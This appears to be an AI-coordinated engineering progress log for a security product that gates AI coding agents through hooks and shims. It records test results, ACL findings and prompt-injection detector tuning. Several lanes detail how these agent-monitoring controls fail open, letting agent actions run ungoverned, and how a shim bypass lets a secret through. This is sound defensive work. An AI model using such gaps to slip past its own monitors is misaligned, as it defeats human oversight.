# Wave 47 — the run to 4.7A readiness

**Started 2026-08-26.** Working the whole of `.plans/READY-FOR-4.7A-MASTER-CHECKLIST.md`.
Every lane is an isolated worktree on a branch off its repo's current `origin/main`, partitioned **by file** so no
two lanes can collide. Nothing here is pushed, merged or deployed — integration is a separate, deliberate step.

Bases: Installers `114dbc03` · Backend `1a24262b` · Frontend `359d6548`.

## Lanes

| # | Checklist item | Repo | Worktree / branch | Hard gate? |
|---|---|---|---|---|
| 1 | §1.1 complete inventory — the sweep sees 200 of 18,299 files | Installers | `r47-inventory` / `wave47/inventory` | **yes (4)** |
| 2 | §1.2 plugins restored on uninstall, both paths, confined | Installers | `r47-plugingate` / `wave47/plugingate` | decision |
| 3 | §2.3 observer for the vendor's own fail-open (+ §3.6, §3.7 research) | Installers | `r47-failopen` / `wave47/failopen` | **yes (2)** |
| 4 | §2.6 real shim interception test + §4.3 re-plug the red gate | Installers | `r47-shimtest` / `wave47/shimtest` | **yes (2)** |
| 5 | §1.3 commit a lockfile, switch to `npm ci` | Backend | `r47-lockfile` / `wave47/lockfile` | decision |
| 6 | §3.3 tool-risk baseline (F41/D4) — **live in production today** | Backend | `r47-toolrisk` / `wave47/toolrisk` | **yes (6)** |
| 7 | §4.1 live-pg fail-closed + §4.8 `guardDegraded` | Backend | `r47-livepg` / `wave47/livepg` | **yes (5)** |
| 8 | §4.2 tests that cross the HTTP boundary | Backend | `r47-httpbound` / `wave47/httpbound` | **yes (5)** |
| 9 | §3.1 `BUILTIN\Users` can read the bearer token | Installers | `r47-winacl` / `wave47/winacl` | |
| 10 | §3.4 prompt lane fires on presence + §3.5 replay brick | Installers | `r47-promptlane` / `wave47/promptlane` | |
| 11 | §3.10 `findingsDropped` + §3.14 `approvalSurface` + §3.13 (BE) | Backend | `r47-console` / `wave47/console` | |
| 12 | §3.8 the console can't tell 3 controls from 8 | Frontend | `r47-attested` / `wave47/attested` | |
| 13 | §3.11 absent total read as whole-scope + §3.12 unsanitised text | Frontend | `r47-fesmall` / `wave47/fesmall` | |
| 14 | §4.5 make the Backend suite runnable (Docker volumes, not bind mount) | Backend | `r47-dockertest` / `wave47/dockertest` | |
| 15 | §3.13 (Go) + register reconcile + two decision briefs | Installers/docs | `r47-misc` / `wave47/misc` | |
| 16 | §4.6 three NOT-RUN discipline gates | Frontend | `r47-gates` / `wave47/gates` | **done** |

## Closed so far

### §4.6 — the three discipline gates have now been run

| Gate | Result |
|---|---|
| `check:ai-security-frontend-consumer` | PASS |
| `check-vocabulary-contrast` | PASS — every text pair clears 4.5:1 and every graphic 3:1, both themes |
| `check:response-only-fields` (digest mode) | PASS |
| `check:response-only-fields` (**drift mode — never run before**) | **FAILED. Real drift found.** |

**What the drift was.** The console carried a stale copy of the registry that decides which fields only the endpoint
may write. The Backend's copy names `teardownObservedAt` / `teardownEvidence` as the sharpest case — they exempt a
row from the signed re-enrollment guard, and a console write path that could set them would hand that exemption to
anyone holding the site API key. The console's copy did not have that at all.

**Why nobody saw it.** The gate exits 0 when it cannot find a Backend checkout. It printed
`OK - digest verified` plus a note that drift `was NOT checked`. A note is not an exit code, and the digest only
proves nobody hand-edited the file.

**Fixed** in `wave47/gates` `7e8cce3b`: registry re-synced, digest refreshed, and that branch now reports
**NOT CHECKED** instead of OK, with `REQUIRE_BACKEND_DRIFT_CHECK=1` turning a missing checkout into a failure.
Proven on all four branches — drift red / cleared green, required-without-checkout red, required-with-checkout green,
digest-only reports NOT CHECKED at exit 0.

## Still owner-only — no agent can close these

- **§0.1 unblock GitHub Actions** (`github.com/organizations/Ceragon-Prod/settings/billing`). Blocks every agent
  release, all CI on 7 repos, §4.4, and M4.7A Risk 2.
- **§0.2 approve an agent release.** Until then every Installers fix in this wave — and the quarantine data-loss fix
  already merged — is live on **zero endpoints**.
- **§0.4 approve a real-box MSI install/uninstall cycle.** §2.1, §2.2, §2.4, §2.5 and §2.7 cannot be closed without
  it; a reinstall has permanently bricked a trust anchor before.
- **§0.3 transcript backup** — declined once; still open.

### §2.7 item 4 — the read-only half, done on this workstation

The full item needs a disposable VM (it changes a registry ACL on a live user hive). Its **precondition
sweep is host-safe and was run**:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Lxss   present: True
  {88643d09-...}  DistributionName=Ubuntu           BasePath=C:\Users\Owner\AppData\Local\wsl\{...}
  {fbc6ddb4-...}  DistributionName=docker-desktop   BasePath=\?\C:\Users\Owner\AppData\Local\Docker\wsl\main
```

Two registrations, and **this is exactly the shape the WSL test fixtures already model** — `cmd/devoid/wsl.go:71-72`
excludes `docker-desktop` and `docker-desktop-data` as system distros, and
`wsl_enumerator_agreement_test.go` asserts the doctor **names** docker-desktop and says it was excluded and why,
rather than silently dropping it, and that it never advises `bootstrap --distro docker-desktop` (advice that would
damage a Docker install).

**So the WSL lane's premise holds on real hardware.** What still cannot be closed here is the access-denied case —
a key that exists but cannot be opened — because producing it means changing the ACL on this profile's live hive,
which the packet forbids on the workstation.

**One thing to check when the VM item runs:** docker-desktop's `BasePath` carries the `\?\` extended-length prefix.
Nothing in `internal/wsldistro` or `internal/pathfix` matches on that prefix. If any consumer ever starts comparing
`BasePath` as a plain string, that entry will not match. Not a defect today — no consumer reads it — but it is the
kind of detail that becomes one silently.

---

## Lane 15 — CLOSED (§3.13 Go, register reconcile, two decision briefs)

`wave47/misc` `fa9ee14c` (Installers) · workspace `a112274` + `393a8f6`. Build verified clean by me
(`go build ./internal/wsldistro/... ./internal/core/backend/...` exit 0) — the agent could only claim a
parse, so this was re-checked rather than accepted.

**Both suspect comments were genuinely false.** Neither was a checklist error:
- `internal/wsldistro/rows.go:68` claimed a distinction had not been drawn — `721c780b` drew it.
- `internal/core/backend/aicontext_findings.go:135-137` claimed a field was inert pending a Backend
  declaration — Backend `ac07b170` declares and persists it.
Adjacent sentences that were re-checked and found **still true** were deliberately left alone.

**Register reconciled: 13 fixed, 2 still open, 0 wrong claims.** The file's failure mode is staleness,
not inaccuracy — every line was true the day it was written. It now opens by saying it is a list of
claims to check, not a worklist.

Two things the register said **about itself** were false and are now corrected:
- "Nothing was pushed" — all **seventeen** SHAs are ancestors of Installers `origin/main`, checked
  individually. Pushed is still not shipped: zero endpoints, per §0.2.
- The trust-anchor deploy-order constraint is now **satisfied**.

**Still open from that file:** `knownTrustLevel` has no telemetry (`requirements.go:865`, line reference
was stale), and the opt-out panel's absent-`total` bug (already lane 13).

### Two new findings from this lane

1. **A closed register line's own resolution text is stale in the direction that costs a live proof.**
   It records that the runbook was corrected to expect exit **1** on a healthy endpoint. The exit code
   changed afterwards and the runbook now correctly says **0**. An operator trusting the register over
   the runbook would abandon a valid proof for the opposite reason.
2. **§3.10 confirmed with a hard zero.** `findingsDropped` appears **0 times** in the query service.
   Fixing the truncation's write side did not make the fact visible to any console reader.

## Correction to §2.1 and §2.2 — the premise was wrong

I reported that hooks fire but do not enforce, on the strength of a destructive delete passing
`PreToolUse`. **DeVoid is not installed on this workstation** — verified: no install directory, no
`ProgramData\devoid` (only a 3-file leftover from 2026-07-14), no `~/.devoid`, no service, no uninstall
registry entry, and **no DeVoid hooks in any Claude Code settings file**, user/project/managed.

The repo already recorded this. `internal/liveproof/register.json` carries four proofs, all
`"observed": false`, all quarantined with the reason *"DeVoid is NOT INSTALLED on the build box"*, and
`docs/ai-security/LIVE_PROOF_PROCEDURE.md` states the proofs need an endpoint the build box does not have.
`go test ./internal/liveproof/...` fails when a control has never fired and its quarantine is missing or
expired — those quarantines expire **2026-11-05**.

**Correct status of §2.1 and §2.2: NOT MEASURED — not "proven broken".** Still a hard gate; different
fix. It is not "repair enforcement", it is "obtain one endpoint and measure".

## §3.1 redirected before it could ship a brick

`internal/liveproof/register.json` entry `machine-secret-denies-local-users` records that the strict
descriptor **already exists and is already pinned in both directions**, that **no production file carries
it**, and that moving the credential files onto it today *"blocks every non-elevated `npm install`
fleet-wide"* — because the unprivileged shim reads the machine credentials and treats a 401 as
fail-closed. The recorded precondition is a per-user credential split plus per-user daemon-token
distribution. Lane 9 has been redirected to the reader-inventory test plus a design for that split.

---

## Lane 7 — CLOSED (§4.1 live-pg fail-closed, §4.8 guardDegraded). 10 commits on `wave47/livepg`.

### The question it was sent to answer

**Is `RUN_INTEGRATION_TESTS=true` actually set where the Backend suite really runs?**

**Yes.** `pr-checks.yml:228, :244, :391, :650` (all 4 shards) and `build.yml:272`. It is set nowhere else —
`package.json:23` is a bare `jest`, no jest config sets it, and the local Docker mirror never names it but
**does inherit it**, verified by executing the mirror's own `planJob` against the real workflow file.

**But since 2026-08-25 no GitHub event runs those workflows at all** — the cost gate left them
`workflow_dispatch`/`repository_dispatch` only. So the switch is correct and the lane it protects executes
only on a deliberate dispatch or a local mirror run.

### The sharper finding — the switch was never enough for seven of them

**7 live-pg specs could not reach a CI database even with the switch on, in any lane, ever.** They do not
read `DATABASE_HOST`. They read `VERDICT_SQL_TEST_DATABASE_URL` (one tries `F38_TEST_DATABASE_URL` first)
and otherwise fall back to laptop ports 5433 / 55432 / 55433. **Neither variable is set in any workflow.**
They take a runtime `dbUp = false` branch, every `it()` returns early and **passes**, Jest counts the file
as a passed suite, and `scripts/assert-suites-executed.js` is structurally blind to it — it can only see a
file Jest marked *skipped*.

Census of all 98: **89 wired** on `DATABASE_HOST`, **7 dark**, 2 wired on their own vars.
The comment at `pr-checks.yml:651-656` still says "47 of the 50". There are 97, and the three it names are
not these seven.

### Proven

Same file, same absent database, opposite verdicts:
```
REQUIRE_LIVE_PG unset  ->  Tests: 19 passed, 19 total   exit 0
REQUIRE_LIVE_PG=true   ->  Tests: 20 failed, 20 total   exit 1
```
§4.8 green against a real Postgres 17 (129 tables, 240 migrations, 323 CHECK constraints): 10/10.
A psql dry-run showed **the real predicate selects 2 rows where the naive one selects 6** — including a
JSON-null row that would have demoted a known fail-open endpoint. That is exactly the class of defect a
TypeScript re-implementation of a database predicate cannot catch.

Default lane unchanged: no test injected, no suite status flipped, the existing suite gate still green.

### PENDING — a workflow edit I must apply at integration (the agent correctly did not touch `.github/**`)

**Order matters. Step 2 before step 1 reds the job on day one.**

1. Add to the Jest `env:` block in `pr-checks.yml` (after :650) and `build.yml` (after :272):
   `VERDICT_SQL_TEST_DATABASE_URL: 'postgresql://codefense:codefense@localhost:5432/codefense_db'`
2. **Only once step 1's run is green**, add `REQUIRE_LIVE_PG: 'true'` to the same blocks.
The mirror inherits both automatically; no `ci/` change needed.

### Not exercised

3 of the 7 dark specs never got a clean run **on this box** — every failure was a timeout or a dropped
connection, **zero assertion-shaped failures**, with single spec files taking 700–1900s under contention
versus 38s alone. That is this wave saturating the machine, not a defect. No full-suite run, no mirror run,
no GitHub run.

`ceragon-ra0-pg` is **behind the migration chain** — its `ai_events` lacks `caused_by_event_id`. A loud
precondition check now names the missing columns and the fixing command. A prepared Postgres is left as
`r47-livepg-pg` on `127.0.0.1:55462`; remove with `docker rm -f r47-livepg-pg`.

---

## Lane 11 — CLOSED (§3.10, §3.14, §3.13 Backend). 4 commits on `wave47/console`.

**§3.10 — the console can now see that evidence was truncated.** `findingsDropped` is projected through
`safeMetadata` and declared on the timeline DTO. One DTO type serves Timeline, Activity and Detections, so
all three get it from one projection. Bounded as a **count**, not text, and absence is never coerced to 0 —
so an untruncated row still hashes as before.

Mutation-proven both halves: removing the allowlist entry reds 5 specs (the 4 that stay green are the
absence controls, correctly); removing the DTO field is invisible to transpile-only jest, so that half is
proven by `tsc` instead — `TS2339: Property 'findingsDropped' does not exist`. Restored, 9/9 green,
including a control at exactly the cap (not a truncation) and an **unknown** key fed to the allowlist and
dropped while the declared one passes. The pass is a declaration, not an open door.

**§3.14 — option C implemented, and the comment defending option B cited its own evidence backwards.**

*Plain English:* the field is a one-word label for **where** an operator approved a data release; the
console prints "approved on …". Under B the backend accepted any 64-character sentence, so a tampered
endpoint could make the console display a plausible approval story of its own wording. Under C only
single-token labels pass — `BROWSER_EXTENSION`, `browser_extension`, `CLI`, `extension-modal` all render
exactly as today; a sentence or markup renders as nothing. **No legitimate producer value is lost.**

The comment justifying B cited a spec line as supporting it. That line sits inside
`it('rejects any other surface claim, including free text')` and asserts the string is **rejected** — the
citation was inverted. The comment also contradicted itself four lines later.
Mutation-proven: reverted to the loose rule, all six legitimate values stay green and only the sentence,
the markup, the HTML-ish label, the quoted claim and the comma list go red. That is a narrowing, not a wall.

**§3.13 — all three Backend comments were genuinely false.** My summary was right on all three; each is
rewritten to name the real producer. Three adjacent comments that were checked and found **still true**
were left alone.

### Follow-ups this lane generated

- **Applied by me** (`a3bb8e4f`): a live-Postgres fixture listed a free-text `approvalSurface` in its
  *legitimate* set — a value no producer can emit — so option C would have read as a regression the first
  time anyone corrected the gate. NOT RUN: no Postgres attached, and per lane 7 these files report green
  when Postgres is absent, so it carries no evidence yet.
- **Routed to lane 12**: the Frontend chip that renders the count. Sent with the control requirement
  (absent and zero must render nothing) and a question — the Backend lane reports **the console renders no
  AI-event findings list at all**, which would make this chip the only findings signal there is.
- **NEW, still open:** `guardDegradedDropped` and `metadataKeysDropped` are the *same defect* — stamped by
  the same writer, read by nobody, absent from both the allowlist and the DTO. §3.10 named only
  `findingsDropped`, so only that was fixed; a tripwire spec now pins `guardDegradedDropped` as *not*
  projected, so whoever adds it sees the pin.

### Measured, not assumed

Three HTTP suites failed with timeouts on the parallel run. Re-run serially on the same branch:
**3 passed, 31 tests, 0 failures.** One of those suites takes 558s alone against a 5s per-test default, so
187 suites in parallel on this bind mount blows it. Not caused by this change. `tsc --noEmit` exit 0. The
138 eslint errors across the touched files all sit on lines this wave never touched — pre-existing red.

**Near-miss worth recording:** this lane ran a `git stash push` it intended to be inert. It captured its own
edit for about a minute, popped it immediately, and verified the seven other stashes (other chats') were
intact. Concurrent sessions share these checkouts — `git stash` is not a safe idle command here.

---

## Lane 9 — RECORDED "NOT LANDABLE" (§3.1). 3 commits on `wave47/winacl`. **No SDDL was changed.**

That is the correct outcome, and it is evidence-backed rather than cautious.

**The register was half stale.** One production file *does* now carry the strict descriptor
(`endpoint_identity_windows.go:32`, landed 2026-08-18); the register entry was written 2026-08-07, so it
was true when recorded and false for eight days. The rest holds: the credential file and the daemon token
are still on the permissive boundary.

**There are THREE non-elevated readers of the daemon token, not one.** The register named one. The third
— the browser prompt-guard host — **fails OPEN**. So anyone who read the old prose, closed the named
reader and narrowed the ACL would have taken the shipped Web AI Guard browser lane down **silently**: it
would keep running and stop governing.

**Landed instead:** a `go/ast` reader-inventory test — resolved selectors, immune to comments and string
literals, no build tag so it runs on the Linux runner CI actually uses. It fails in **both** directions:
a new non-elevated reader appears, *or* the last one disappears. Mutation-proven both ways, plus the
tightening itself proven to go red naming the exposure.

### The second door — three components encode two opposite boundaries

Verified by me directly:
- `install-scripts/production/install.ps1:2585-2596` **always re-asserts** a restrictive DACL on the
  daemon token — installing user + Administrators + SYSTEM, inheritance disabled — and its own comment
  calls itself *"the ACL-repair path for a token the daemon minted itself with the permissive inherited
  ACL"*. It then prints **"Daemon capability token ACL enforced"**.
- `internal/daemon/daemon_auth.go:209` documents the opposite intent — *"protected file ACL granting
  Builtin Users read on Windows, so the human-user shim can authenticate"* — and
  `loadOrCreateDaemonToken` **re-asserts the at-rest perms on every reuse, not just on mint**.
- `windows-installer/msi-build/verify-msi-acl.ps1:1100` **asserts a non-admin CAN read both secrets.**

The installer runs once; the daemon runs on every start. **The daemon wins, so the installer's message is
the falsehood.** And the daemon is not simply wrong — its looseness is what keeps non-elevated
`npm install` working, because the shim treats a refusal as fail-closed. The one automated gate that
would catch a bad tightening runs only on GitHub Windows runners, which cannot be mirrored and are
blocked.

On Windows there is also **no second factor** behind that token — the peer-identity check is a no-op off
Linux — so it is the only local authentication for restore, shutdown and the posture routes that were
moved behind a token *precisely because loopback is not a boundary*. Two comments promising a "per-user"
token were corrected by me (`b2302589`).

A full per-user-split design is in the lane report, including the sharp part: the "may only ever tighten"
rule that is protective today becomes the delivery mechanism for a fleet-wide outage the moment the
routing constant changes.

---

## Lane 4 — CLOSED (§2.6 real shim test, §4.3 the alarm). 3 commits + `6ac4e38` in the workspace repo.

**The fake is gone.** Shim directories now hold byte-identical copies of the real binary, re-verified
before anything is asserted, and the assertions are on **the side effect — whether the commit reached the
bare remote** — not on exit codes.

Green across **all 6 Linux shells × 3 scenarios × both privilege modes.** The allow-control and the block
go through the *same* branch and differ only in verdict, and a bypass leg re-sends the blocked push and
lands it — which is what rules out "the push failed for an unrelated reason".

### The mutation that caught a hole in the test's own first version

With enforcement removed, **the product still prints "PUSH BLOCKED" and pushes anyway.** On the `.env`
input an unrelated fail-closed control happened to stop the push, so exit code, unmoved ref and the
message all looked correct. Only asserting *"the run must stop at the gate"* separates them. The first
version of the test went red one case too late. **The message is not the enforcement.**

A fourth mutation proves the shell-profile shim is load-bearing rather than decoration: identical commit,
identical remote, PATH the only difference — on PATH the push is refused; off PATH the hook fails open and
**the secret lands**.

### The alarm is re-plugged, cheaply

Weekly schedule; every job except the deliberately-red one carries an event filter, so a scheduled run is
**one Linux job — roughly two cents a week**, against the ~$600 month the pull-request trigger produced.
The RED-ON-PURPOSE block is verbatim, with a note that it is deliberately the one job without a filter so
nobody silences it by adding one. `finding-b-e2e` gets a path-filtered push-on-main running only the new
enforcement job, plus a monthly full matrix.

**Not exercised:** GitHub Actions never ran — every trigger, filter and schedule is static reasoning only.
macOS and Windows legs unrun (no macOS runtime; Docker here is the Linux engine).

---

## A claim I checked and did NOT act on

The tool-risk lane reported that the interruption copy "names no dial" and still says "Cera". **Both are
stale.** `internal/daemon/ai_handlers.go:3962` says **DeVoid**, and `:3982` already appends
*"To stop this interruption: AI Security -> Tool-Risk -> {class} -> Monitor"*. The only "Cera" strings in
that tree are deliberate pre-rebrand scheduled-task name lookups. **F41(c)'s "name the class and the dial"
is DONE.** The remaining half is surfacing `exclusions.allow` in the console — Backend already carries it.

---

## Lane 5 — CLOSED (§1.3 lockfile). 5 commits on `wave47/lockfile`.

Two clean installs from **separate empty caches**: 1016 packages each, identical tree hash
`6dda24f3…`. Build exit 0, 3673 dist files, zero TS errors. Audit gate passed with **0 unaccounted
high/critical**; the allowlist stays empty. The gate can go red — a deliberate `package.json`/lockfile
mismatch produced `Invalid: lock file's axios@1.20.0 does not satisfy axios@1.19.0`.

**The real evidence is the negative, and it is not what "reproducible install" usually means.** Two
unlocked installs *at the same instant* agree. The failure is that the answer changes underneath you:
**21 of 80 direct dependencies differed** between the developer's installed tree and a same-day fresh
resolve, with **zero commits to `package.json`** — axios 1.16→1.20, openai 6.25→6.49, typeorm
0.3.28→0.3.31, @typescript-eslint 8.59→8.68, and 17 more. `ajv` was installed at 8.18.0 while
`package.json` demands exactly 8.20.0.

**The lane retracted its own reasoning after measuring it.** It first wrote that the lockfile landed on a
working `@types/node` only because of the pin. Then it swapped in 20.19.43 by unpacking the tarball
directly (npm silently reverted an earlier attempt — worth knowing) and measured: **0 errors either way.**
The documented 3-error breakage no longer reproduces, and *why* is not established. Pin kept on narrower
honest grounds, written into the step, with relaxing it named as a real option rather than a trap.

Frontend confirmed genuinely using its lockfile (`npm ci` in pr-checks, security, and the Dockerfile).

**Highest residual risk:** the **Docker image build never succeeded** — three attempts, all failing on
container→registry egress, never on the lockfile. The same `npm ci --omit=dev` succeeds on Windows, so
the lockfile is installable dev-free, but the Linux leg is unverified and the Dockerfile builds what ships.

Also found, reported not fixed: **the committed `shared-contracts/dist` does not match its source** — the
de-AI sweep edited the built artifact rather than the source, so every rebuild reintroduces em dashes.
And `.gitattributes` does not pin the lockfile to LF, in a repo whose own file documents four prior CRLF
incidents.

**Method warning worth keeping:** `git show "origin/main:.github/…"` fails under MSYS path mangling on
this box, and a `|| echo` fallback swallowed it into a **false negative**. Use `MSYS_NO_PATHCONV=1`.

**Fixed by me** (`e0ee2bd`): the mirror's own docs asserted the Backend has no lockfile and cannot use
`npm ci`. The mirror reads commands from the real workflows and picked the change up unaided — only the
prose was stale, which is the worse half.

---

## Lane 8 — CLOSED (§4.2 HTTP boundary). 4 commits on `wave47/httpbound`.

Three specs booting a **real Nest app over a real socket** with the production bootstrap — real rawBody
verify, cookie parser, helmet, exception filter, the real ingest pipe, real guards. The policy-bundle spec
derives a **genuine HMAC signature** from the keyring and verifies it through the real signature guard
against a real database row, so the endpoint identity is crypto-derived rather than injected. Schema built
fresh: 240 migrations, 323 CHECK constraints. Baseline 48/48 green.

Five mutations, all red then green. **The most important is M2:** stop the controller forwarding one field
and the request still returns **201 in every case** — only the stored-row assertion notices. That is
exactly how a silently-dead column shipped here before.

### New finding — the tolerate-and-drop mechanism has a layer in front of it that tolerates nothing

Guards run **before** validation in Nest, and `SiteGuard` reads the raw request body. So an agent that
starts stamping a site identifier onto an enrolment body gets **403 Forbidden**, not a silent drop —
reproducing the exact fleet-wide-outage class the tolerance mechanism exists to prevent, one layer earlier,
where nobody has been auditing. **The pipe is the wrong place to look.** Sent back to be fixed at the right
layer, with a tenant-boundary test and a sweep for sibling guards.

### Three more, pinned at the wire

- **The signature timestamp header is ISO-8601, not epoch seconds.** Nothing in the repo pinned this. If
  the Go agent ever "simplifies" to epoch, **policy delivery dies fleet-wide and the signing code still
  looks correct.**
- The exception filter **echoes the raw internal error string** on unhandled 500s unless
  `NODE_ENV=production` — deliberate, but a dev or staging box leaks internals in the response body.
- **A bearer-only endpoint gets 403 from the policy bundle and no policy at all**, while the console shows
  it healthy. That is this campaign's core failure shape and it is adjacent to a hard gate. Routed to a
  decision brief; behaviour unchanged.

---

## Lane 13 — CLOSED (§3.11, §3.12). 2 commits on `wave47/fesmall`, now resumed with a widened scope.

**§3.11 proven by showing the defect verbatim:** with no total on the wire, the pre-fix panel rendered a
**byte-identical string** to the measured case. Now three distinct states. A sibling in the same file was
worse — an unreported *population* was printed as the row count of the page in front of the operator.

**§3.12 — honest verdict: robustness, not a vulnerability.** AST-verified across 1,483 files: **zero**
`dangerouslySetInnerHTML` anywhere. The suite *demonstrates* the escaping rather than asserting it, by
feeding it script and image-onerror payloads and requiring no element is created — **and those cases
passed on the unfixed code**, which is the evidence for the verdict rather than a weakness in it. What was
genuinely possible and is now closed: right-to-left override characters reversing displayed text,
invisible characters inside words, newlines breaking the sentence, and a 5,000-character flood.

**The file already contained the fix**, with a doc comment describing this exact defect — wired to a
different banner one section below and never to the reported line.

**A closed-set lookup walked the JavaScript prototype.** `constructor` returns a Function and React
renders **nothing** — the reason a capability is inactive silently vanishes. `__proto__` returns
`Object.prototype` and React **throws**, taking the whole card down. Inert shape 4 exactly: the set had
only ever been fed its own members.

**Its own test was inert first** — it asserted only that the page survived, and passed against the broken
lookup for 4 of 5 tokens. Rewritten to a positive assertion; all five then go red unfixed.

**Systemic:** ~25 further sites across the console render server-supplied text raw. Now producing a
census rather than a patch, plus the shared-component fix, the sibling sites in its own directory, and the
`exclusions.allow` console surface that F41(c) still needs.

---

## Lane 2 — CLOSED (§1.2 plugins restored on uninstall). 2 commits on `wave47/plugingate`.

Restore is wired into **both** uninstall paths. The stash engine moved to a new leaf package
`internal/plugingatestash`, mirroring the `aicontextstash` precedent — and the reason is **measured, not
assumed**: a blank import of `internal/plugingate` takes the MSI guard from **117 to 243 packages and
4.4 MB to 6.9 MB**, dragging an HTTP client into a custom action embedded in the installer.

**Confinement covers three kinds of path**, not one: declaration destinations and the settings-document
path bounded to the owning home, backup sources bounded to the stash directory. The settings path is the
easy miss — restore rewrites that JSON, so leaving it unbounded is the same elevated write by a longer
route. Backup sources are bounded even though only read, because the read feeds the write.

**The two-branch route is genuinely covered.** Reverting the CLI wiring reds `internal/uninstall` while
the MSI tests stay green; reverting the MSI wiring reds `cmd/devoid-msi-root-guard` while the CLI tests
stay green — **different files**, not one branch tested twice. Reverting confinement reds four cases
across three packages, including the `bobby`-versus-`bob` sibling.

**Controls present**, without which "preserves correctly" and "never deletes anything" are the same green:
a clean stash is restored *and its directory deleted*, on both paths. Plus orphan `.bak` with no record
(the case a record-counter cannot see), unparseable record, stray file, subdirectory, unknown backup
format, drift, and unreadable — each blocking deletion without overclaiming that data is at risk.

### ⚠️ A consequence of the decision, surfaced rather than discovered later

**Uninstalling DeVoid now re-enables plugins DeVoid had blocked.** Restore puts the coordinate back into
the enabled set. That is the decision working exactly as asked — uninstall returns the machine to its
pre-DeVoid state and destroys nothing — but if a plugin was neutralised *because it looked malicious*,
uninstalling re-arms it.

A narrower variant exists and was not built, because it was not what was asked: restore the **file**
(which is the whole point — the content exists nowhere else) but leave the plugin **disabled**, and say so.
That keeps both properties: nothing destroyed, nothing re-armed. **Owner call.**

### ⚠️ Integration hazard for whoever merges this

`gofmt -l` flags **almost every `.go` file in this repository** because `core.autocrlf=true` rewrites line
endings in the working tree. It is CRLF noise, pre-existing, and **`gofmt -w` across this tree would
produce an enormous spurious diff.** Verify formatting on LF-normalised copies of only the files you
touched.

**Not exercised:** no real MSI uninstall (needs owner approval and a real box), so three things stay
unproven — that the custom action reaches this code under a live SYSTEM token, how the installer's own
folder-removal rows behave against a preserved directory inside a real transaction, and cross-profile ACL
behaviour, since tests write as the current user and SYSTEM restoring into *another* user's profile was
never actually attempted.

---

## Lane 3 — CODE COMPLETE (§2.3 observer for the vendor's fail-open). **HARD GATE.** 3 commits on `wave47/failopen`.

**Mechanism chosen: the spawn-side counter.** The hook writes one content-free marker before it decides and
removes it once the runtime has the bytes. An invocation the client killed, that crashed, or that exited
non-zero never removes its marker, so **it leaves its own evidence**. The daemon reaps markers older than
any window a client could still be waiting in.

### Two of my premises were wrong, and the lane checked rather than assumed

- **The vendor's failure line is NOT missing from old builds.** `hook: SessionStart Failed` and
  `hook: UserPromptSubmit Failed` were captured verbatim on **0.134** by two operators, and the format
  literal is present in the installed **0.147** binary. The 0.144-pinned string I warned about is a
  *different* string — `hook: UserPromptSubmit Blocked`, the canary marker.
- **So parsing was rejected on availability, not on version.** That line goes to the Codex process's own
  output. DeVoid is not its parent and the client does not persist it — the log directory holds one login
  log from May. Parsing would mean wrapping or shimming the vendor binary. **Everything a parser could
  tell us, the absence of a delivery already tells us, with nothing pinned to a vendor build.**

### It refused to ship the count on a field that would be dropped

The signal rides the **existing** undecidable evidence channel as new reason *values*, following a
precedent already in the tree. The lane deliberately did **not** add a field to the counters block,
because a test pins that block to exactly the keys the Backend allowlist knows — **an extra key is
silently dropped in transit.** Shipping a count on a dropped field would be green-over-a-dead-path again.
Getting it onto that block needs a Backend change first (`runtime-adapter-shape.ts`), which is outside
this repo. **Pending integration item.**

### The defect it found while proving its own work

The daemon resolved the marker directory from **its own home**. On a machine-scope install it runs as
SYSTEM, whose profile no hook ever writes to — so the reaper would have read an empty directory and
**reported a confident zero.** It now reaps every enumerated non-service profile and *counts the profiles
it could not read* rather than letting the ones it could stand in for the machine.

Its own first cut also had a defect the tests caught: the marker's name-sanitiser **sanitised rather than
rejected**, so a home directory, a project name and a token body all survived into the marker. It now
records `unknown` for anything outside the closed alphabet.

### Four states proven, not three

Mutation: neutralise the writer with one line → **10 tests fail, every one on a loud precondition**
(*"the writer did not record this spawn, so every count below would be measuring nothing"*). Restored →
green. Correctly **still green** under the mutation: the three not-measured tests — an endpoint with no
observer *is* not-measured.

- **measured zero** — and the daemon mints no row, because silence is right there.
- **measured N** — *"1 invocation(s) were spawned and delivered no decision — those actions ran ungoverned"*.
- **not measured** — *"no count is available from this endpoint; this is not a zero"*, never a count.
- **the fourth branch a two-state design gets wrong** — measured, zero denominator → *"a measured absence,
  not a pass"*.

Every sentence, including the clean one, names the tier a spawn-side observer **cannot** see.
Standing prohibition held and asserted: the verdict stays UNVERIFIABLE and `Clean()` stays **false**.

**Not exercised:** no real ungoverned Codex session — synthetic spawns only. The proof is ~15 minutes on
an enrolled endpoint with a deliberately broken hook target. Nothing exercised on the Backend side.

### §3.6 — recorded NO, and the checklist's premise was wrong

There are **three** Codex clients on this machine, not the two the checklist assumed: **0.147.0** (the npm
CLI), **0.149.0-alpha.4.1** (inside the desktop app), and 0.130.0-alpha.5 (the launcher, below the floor).
**No 0.144. No 0.148.**

The artefacts *are* obtainable — the 0.147 binary carries the exact surface — but taking them means
running an authenticated Codex client against a prepared home, which is a live-proof act on a real
endpoint, not something a code change may do to itself. The one vendor source tree on this box is a
directory skeleton with **zero files**.

**Recommendation: do not widen now**, and note what widening would buy — *one row*. The desktop app on the
same machine runs 0.149 and would still say unverified. The durable fix is for hook-trust to stop being
version-pinned at all, which is a design change.

### §3.7 — a third option, better than either of mine

Closing it is expensive **not because of that line** but because an unknown hook row drags the *whole*
report down to "posture not attestable" — you would lose six true statements to gain one honest absence,
plus a red mark nobody on those machines can clear. The lane recommends changing the **rollup** so an
unknown hook row marks only that row. Nothing changed; this is an owner decision.

**And a warning I would have missed:** §2.3 does **not** compensate for §3.7. A wrong dialect makes the
client refuse to spawn our hook at all — and a spawn-side observer sees nothing when it is never spawned.
That is exactly the tier the observer discloses as unmeasured on every line it prints.

---

## Lane 10 — CLOSED (§3.4 prompt-lane corpus, §3.5 replay brick). 5 commits on `wave47/promptlane`.

### The numbers, which are the deliverable

```
CORPUS: 87 cases (52 benign, 35 attack); 8 carry origin=real
FALSE POSITIVES:                     before 30/52   after 15/52
TRUE POSITIVES:                      before 35/35   after 34/35
BENIGN TEXT REACHING THE BLOCK TIER: before 8       after 0
```

**The last line is the one that mattered.** Reaching the block tier is what bricks a thread and what made
engineers unable to document their own detector. It is now zero. Every remaining false positive is a warn.

**Before this, the entire prompt-lane denominator on this box was FIVE cases, exactly one of them
quotation-shaped.** That is why a day of security engineering walked straight through it.

**The one detection lost is declared, not hidden:** a *lone* system-exfil signal wrapped in quotation
marks demotes one tier and no longer warns. It is named in the harness, and the harness **fails on any
